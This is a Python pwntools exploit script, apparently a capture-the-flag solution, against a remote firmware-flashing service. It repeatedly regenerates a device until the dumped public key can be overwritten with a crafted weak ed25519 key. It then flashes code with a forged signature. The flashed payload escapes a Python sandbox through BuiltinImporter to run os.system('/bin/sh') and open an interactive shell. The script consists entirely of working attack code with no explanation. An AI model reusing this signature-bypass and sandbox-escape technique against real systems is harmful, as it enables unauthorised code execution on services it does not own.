#!/usr/bin/env python3

import ed25519


from pwn import *
context.encoding = 'utf8'
#  context.log_level = 'debug'


host = '9e7c46be84ff68bc91d94d09-1024-fused.challenge.master.camp.allesctf.net'
io = remote(host, 31337, ssl=True)


PROGRAM_INSTRUCTION_SEGMENT = 0
STATIC_DATA_SEGMENT = 1
DYNAMIC_DATA_SEGMENT = 2

def _choice(o):
    io.sendlineafter('5. Exit.\n\nChoice: ', o)

def create_new_mcu():
    _choice('1')

def flash_segment(segment, image, signature=None):
    if signature is None:
        signature = bytes(1)
    else:
        assert len(signature) == 64
    assert len(image) > 0
    assert len(signature) > 0

    _choice('2')
    io.sendlineafter('Segment: ', str(segment))
    io.sendlineafter('Image: ', image.hex())
    io.sendlineafter('Signature: ', signature.hex())

def dump_segment(segment):
    import hexdump
    _choice('3')
    io.sendlineafter('Segment: ', str(segment))
    io.recvuntil('Content: \n')
    return hexdump.restore(io.recvuntilS('\n\nMain menu:', drop=True))

def run_mcu():
    _choice('4')

my_pk = bytes([238, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 127])
signature = bytes([1] + [0]*63)

code = b'''
[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'BuiltinImporter'][0]().load_module('os').system('/bin/sh')
'''
code += b'#'*(1024-len(code))


while True:
    create_new_mcu()
    their_pk = dump_segment(STATIC_DATA_SEGMENT)[0:32]
    if all(a | b == a for a, b in zip(my_pk, their_pk)):
        print('Got it.')
        break
flash_segment(STATIC_DATA_SEGMENT, my_pk)
assert dump_segment(STATIC_DATA_SEGMENT)[0:32] == my_pk
ed25519.VerifyingKey(my_pk).verify(signature, code)
flash_segment(PROGRAM_INSTRUCTION_SEGMENT, code, signature)
run_mcu()

io.interactive()
io.close()
